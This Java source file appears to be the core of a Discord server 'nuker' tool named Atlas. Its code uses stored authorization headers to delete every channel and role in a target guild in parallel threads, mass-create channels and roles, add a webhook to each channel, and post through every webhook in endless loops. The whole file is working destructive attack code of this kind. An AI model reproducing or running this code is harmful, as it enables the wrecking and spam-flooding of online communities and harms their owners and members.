package com.atlas;

import java.util.*;

import org.json.JSONArray;
import org.json.JSONObject;

public class atlasFunctions {
    static String baseUrl = atlas.baseUrl;
    static Map<String, String> headers = atlas.globalHeaders;
    static String guildID = atlas.guildID;

    private static List<String> getChannels() {
        List<String> channels = new ArrayList<>();

        try {
            String mainURL = baseUrl + "/guilds/" + guildID + "/channels";
            String response = atlasUtils.sendGetRequest(mainURL, headers); 

            if (response != null) {
                if (response.trim().startsWith("[")) {
                    JSONArray jsonArray = new JSONArray(response);
                    for (int i = 0; i < jsonArray.length(); i++) {
                        JSONObject channel = jsonArray.getJSONObject(i);
                        channels.add(channel.getString("id"));
                    }
                } else if (response.trim().startsWith("{")) {
                    JSONObject jsonObject = new JSONObject(response);
                    JSONArray jsonArray = jsonObject.getJSONArray("channels");
                    for (int i = 0; i < jsonArray.length(); i++) {
                        JSONObject channel = jsonArray.getJSONObject(i);
                        channels.add(channel.getString("id"));
                    }
                } else {
                    atlasUtils.printError("unexpected response format: " + response);
                }
            }
        } catch (Exception e) {
            atlasUtils.printErrorException(e);
        }

        return channels;
    }

    private static List<String> getRoles() {
        List<String> roles = new ArrayList<>();

        try {
            String mainURL = baseUrl + "/guilds/" + guildID + "/roles";
            String response = atlasUtils.sendGetRequest(mainURL, headers); 

            if (response != null) {
                if (response.trim().startsWith("[")) {
                    JSONArray jsonArray = new JSONArray(response);
                    for (int i = 0; i < jsonArray.length(); i++) {
                        JSONObject role = jsonArray.getJSONObject(i);
                        roles.add(role.getString("id"));
                    }
                } else if (response.trim().startsWith("{")) {
                    JSONObject jsonObject = new JSONObject(response);
                    JSONArray jsonArray = jsonObject.getJSONArray("roles");
                    for (int i = 0; i < jsonArray.length(); i++) {
                        JSONObject role = jsonArray.getJSONObject(i);
                        roles.add(role.getString("id"));
                    }
                } else {
                    atlasUtils.printError("unexpected response format: " + response);
                }
            }
        } catch (Exception e) {
            atlasUtils.printErrorException(e);
        }

        return roles;
    }

    private static List<String> getWebhooks(String channel_id) {
        List<String> webhooks = new ArrayList<>();

        try {
            String mainURL = baseUrl + "/channels/" + channel_id + "/webhooks";
            String response = atlasUtils.sendGetRequest(mainURL, headers); 

            if (response != null) {
                if (response.trim().startsWith("[")) {
                    JSONArray jsonArray = new JSONArray(response);
                    for (int i = 0; i < jsonArray.length(); i++) {
                        JSONObject channel = jsonArray.getJSONObject(i);
                        webhooks.add(channel.getString("url"));
                    }
                } else if (response.trim().startsWith("{")) {
                    JSONObject jsonObject = new JSONObject(response);
                    JSONArray jsonArray = jsonObject.getJSONArray("webhooks");
                    for (int i = 0; i < jsonArray.length(); i++) {
                        JSONObject channel = jsonArray.getJSONObject(i);
                        webhooks.add(channel.getString("url"));
                    }
                } else {
                    atlasUtils.printError("unexpected response format: " + response);
                }
            }
        } catch (Exception e) {
            atlasUtils.printErrorException(e);
        }

        return webhooks;
    }

    public static void deleteChannels() {
        List<Thread> threads = new ArrayList<>();
        List<String> channels = getChannels();

        class InnerAtlasFunctions {
            public void deleteChannel(String channel_id) {
                try {
                    String mainURL = baseUrl + "/channels/" + channel_id;
                    String response = atlasUtils.sendDeleteRequest(mainURL, headers);

                    if (response != null) {
                        System.out.println("\u001B[1;36mATLAS:\u001B[0m deleted channel: \u001B[1;36m" + channel_id + "\u001B[0m");
                    }
                } catch (Exception e) {
                    atlasUtils.printErrorException(e);
                }
            }
        }

        for (String channel : channels) {
            InnerAtlasFunctions innerAtlasFunctions = new InnerAtlasFunctions();
            Thread thread = new Thread(() -> innerAtlasFunctions.deleteChannel(channel));
            threads.add(thread);
        }

        for (Thread thread : threads) {
            thread.start();
        }

        for (Thread thread : threads) {
            try {
                thread.join();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    public static void deleteRoles() {
        List<Thread> threads = new ArrayList<>();
        List<String> roles = getRoles();

        class InnerAtlasFunctions {
            public void deleteRole(String role_id) {
                try {
                    String mainURL = baseUrl + "/guilds/" + guildID + "/roles/" + role_id;
                    String response = atlasUtils.sendDeleteRequest(mainURL, headers);

                    if (response != null) {
                        System.out.println("\u001B[1;36mATLAS:\u001B[0m deleted role: \u001B[1;36m" + role_id + "\u001B[0m");
                    }
                } catch (Exception e) {
                    atlasUtils.printErrorException(e);
                }
            }
        }

        for (String role : roles) {
            InnerAtlasFunctions innerAtlasFunctions = new InnerAtlasFunctions();
            Thread thread = new Thread(() -> innerAtlasFunctions.deleteRole(role));
            threads.add(thread);
        }

        for (Thread thread : threads) {
            thread.start();
        }

        for (Thread thread : threads) {
            try {
                thread.join();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    public static void createChannels(String name, int amount) {
        List<Thread> threads = new ArrayList<>();

        class InnerAtlasFunctions {
            public void createChannel(String name) {
                try {
                    String mainURL = baseUrl + "/guilds/" + guildID + "/channels";
                    JSONObject forRequest = new JSONObject();
                    forRequest.put("name", name);
                    forRequest.put("type", 0);

                    String jsonRequest = forRequest.toString();
                    String response = atlasUtils.sendPostRequest(mainURL, jsonRequest, headers);

                    if (response != null) {
                        JSONObject jsonResponse = new JSONObject(response);
                        String id = jsonResponse.getString("id");
                        System.out.println("\u001B[1;36mATLAS:\u001B[0m created channel: \u001B[1;36m" + id + "\u001B[0m");
                    }
                } catch (Exception e) {
                    atlasUtils.printErrorException(e);
                }   
            }
        }

        for (int i = 0; i < amount; i++) {
            InnerAtlasFunctions innerAtlasFunctions = new InnerAtlasFunctions();
            Thread thread = new Thread(() -> innerAtlasFunctions.createChannel(name));
            threads.add(thread);
        }

        for (Thread thread : threads) {
            thread.start();
        }

        for (Thread thread : threads) {
            try {
                thread.join();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    public static void createRoles(String name, int amount) {
        List<Thread> threads = new ArrayList<>();

        class InnerAtlasFunctions {
            public void createRole(String name) {
                try {
                    String mainURL = baseUrl + "/guilds/" + guildID + "/roles";
                    JSONObject forRequest = new JSONObject();
                    forRequest.put("name", name);

                    String jsonRequest = forRequest.toString();
                    String response = atlasUtils.sendPostRequest(mainURL, jsonRequest, headers);

                    if (response != null) {
                        JSONObject jsonResponse = new JSONObject(response);
                        String id = jsonResponse.getString("id");
                        System.out.println("\u001B[1;36mATLAS:\u001B[0m created role: \u001B[1;36m" + id + "\u001B[0m");
                    }
                } catch (Exception e) {
                    atlasUtils.printErrorException(e);
                }
            }
        }

        for (int i = 0; i < amount; i++) {
            InnerAtlasFunctions innerAtlasFunctions = new InnerAtlasFunctions();
            Thread thread = new Thread(() -> innerAtlasFunctions.createRole(name));
            threads.add(thread);
        }

        for (Thread thread : threads) {
            thread.start();
        }

        for (Thread thread : threads) {
            try {
                thread.join();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    public static void createWebhooks(String name) {
        List<Thread> threads = new ArrayList<>();
        List<String> channels = getChannels();

        class InnerAtlasFunctions {
            public void createWebhook(String channel_id, String name) {
                try {
                    String mainURL = baseUrl + "/channels/" + channel_id + "/webhooks";
                    JSONObject forRequest = new JSONObject();
                    forRequest.put("name", name);

                    String jsonRequest = forRequest.toString();
                    String response = atlasUtils.sendPostRequest(mainURL, jsonRequest, headers);

                    if (response != null) {
                        // not to be used
                        // JSONObject jsonResponse = new JSONObject(response);
                        // String url = jsonResponse.getString("url");
                        // webhooks.add(url);
                        System.out.println("\u001B[1;36mATLAS:\u001B[0m created webhook: \u001B[1;36m" + channel_id + "\u001B[0m (this is channel id where webhook created)");
                    }
                } catch (Exception e) {
                    atlasUtils.printErrorException(e);
                }   
            }
        }

        for (String channel : channels) {
            InnerAtlasFunctions innerAtlasFunctions = new InnerAtlasFunctions();
            Thread thread = new Thread(() -> innerAtlasFunctions.createWebhook(channel, name));
            threads.add(thread);
        }

        for (Thread thread : threads) {
            thread.start();
        }

        for (Thread thread : threads) {
            try {
                thread.join();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    public static void spamWebhooks(String context) {
        List<Thread> threads = new ArrayList<>();
        List<List<String>> webhooks = new ArrayList<>();
        List<String> channels = getChannels();
        for (String channel : channels) {
            webhooks.add(getWebhooks(channel));
        }
        

        class InnerAtlasFunctions {
            public void spamWebhook(String webhook_url, String content) {
                try {
                    while (true) {
                        String mainURL = webhook_url;
                        JSONObject forRequest = new JSONObject();
                        forRequest.put("content", content);

                        String jsonRequest = forRequest.toString();
                        String response = atlasUtils.sendPostRequest(mainURL, jsonRequest, headers);

                        if (response != null) {
                            System.out.println("\u001B[1;36mATLAS:\u001B[0m spammed webhook: \u001B[1;36m" + content + "\u001B[0m");
                        }
                    }
                } catch (Exception e) {
                    atlasUtils.printErrorException(e);
                }   
            }
        }

        for (List<String> webhookList : webhooks) {
            for (String webhook : webhookList) {
                InnerAtlasFunctions innerAtlasFunctions = new InnerAtlasFunctions();
                Thread thread = new Thread(() -> innerAtlasFunctions.spamWebhook(webhook, context));
                threads.add(thread);   
            }
        }

        for (Thread thread : threads) {
            thread.start();
        }

        for (Thread thread : threads) {
            try {
                thread.join();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}
